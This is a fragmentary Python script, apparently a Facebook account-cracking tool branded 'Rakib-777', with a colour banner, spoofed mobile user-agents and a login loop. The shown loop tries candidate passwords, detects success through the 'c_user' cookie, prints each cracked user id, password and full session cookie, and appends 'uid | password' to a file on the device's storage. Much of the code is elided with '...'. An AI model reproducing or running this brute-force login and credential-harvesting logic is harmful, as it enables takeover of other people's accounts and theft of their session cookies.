...
ha = current.day
today = date.today()
#Rakib-7772 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mRakib-777')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Rakib-777/1.2.0 OPN-B'
...
def banner():
    clear()
    print(f"""\033[1;92m
\033[1;91m        ___    _   _  _____ ___        __  __
\033[1;91m       | _ \  /_\ | |/ /_ _| _ )  ___  \ \/ /
\033[38;5;208m   |   / / _ \| ' < | || _ \ |___|  >  <  
\033[38;5;208m   |_|_\/_/ \_\_|\_\___|___/       /_/\_\ 
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mRakib-777 \033[1;92m         | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mRakibul Islam \033[1;92m    |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/Rakib.chy.1257?mibextid=ZbWKwL')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Rakib-777_OK.mp3")
                print('\033[1;92m[Rakib-777-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Rakib-777-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mRakib-777","\x1b[1;92mRakib-777","\x1b[1;93mRakib-777","\x1b[1;94mRakib-777","\x1b[1;95mRakib-777","\x1b[1;96mRakib-777","\x1b[1;97mRakib-777","\x1b[1;91mRakib-777","\x1b[1;92mRakib-777","\x1b[1;93mRakib-777","\x1b[1;94mRakib-777","\x1b[1;95mRakib-777","\x1b[1;96mRakib-777"])
